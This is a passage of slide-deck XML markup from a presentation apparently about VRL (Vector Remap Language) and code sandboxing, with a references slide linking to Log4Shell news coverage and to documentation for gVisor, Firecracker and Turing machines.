                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>******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2 objectfs: </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Safety</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Performance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Permet de “mapper” des événements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69" name="Google Shape;269;p41" title="gigach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425" y="2860175"/>
            <a:ext cx="1743650" cy="20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2" title="vr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950" y="1211575"/>
            <a:ext cx="1648600" cy="16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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="243850" y="463500"/>
            <a:ext cx="86106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VRL: Vector Remap Language</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="276" name="Google Shape;276;p42" title="gigach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425" y="2860175"/>
            <a:ext cx="1743650" cy="20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2" title="vr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950" y="2036875"/>
            <a:ext cx="53435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Code… ⌛</a:t>
            </a:r>
            <a:endParaRPr/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500" y="934600"/>
            <a:ext cx="448781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idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="235525" y="914525"/>
            <a:ext cx="85206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310"/>
              <a:t>Log4Shell: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https://www.ibm.com/think/topics/log4shell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https://arstechnica.com/information-technology/2021/12/as-log4shell-wreaks-havoc-payroll-service-reports-ransomware-attack/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https://www.theguardian.com/technology/2021/dec/10/software-flaw-most-critical-vulnerability-log-4-shell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https://www.washingtonpost.com/technology/2021/12/20/log4j-hack-vulnerability-java/</a:t>
            </a:r>
            <a:endParaRPr sz="131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0"/>
              <a:t>Docker, gVisor, Firecracker, Isolates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hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>https://gvisor.dev/docs/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hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>https://firecracker-microvm.github.io/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hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId9"/>
              </a:rPr>
              <a:t>https://deno.com/blog/subhosting-security-run-untrusted-code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https://stackoverflow.com/questions/32756988/what-is-meant-by-shared-kernel-in-docker</a:t>
            </a:r>
            <a:endParaRPr sz="131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0"/>
              <a:t>Turing Machines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https://plato.stanford.edu/entries/turing-machine/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https://plato.stanford.edu/entries/church-turing/</a:t>
            </a:r>
            <a:endParaRPr sz="131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0"/>
              <a:t>VRL</a:t>
            </a:r>
            <a:endParaRPr sz="1310"/>
          </a:p>
          <a:p>
            <a:pPr indent="-3117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10"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1310" u="sng">
                <a:solidFill>
                  <a:schemeClr val="accent5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https://vector.dev/docs/reference/vrl/</a:t>
            </a:r>
            <a:endParaRPr sz="1310"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="289" name="Google Shape;289;p44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="478225" y="394925"/>
            <a:ext cx="7179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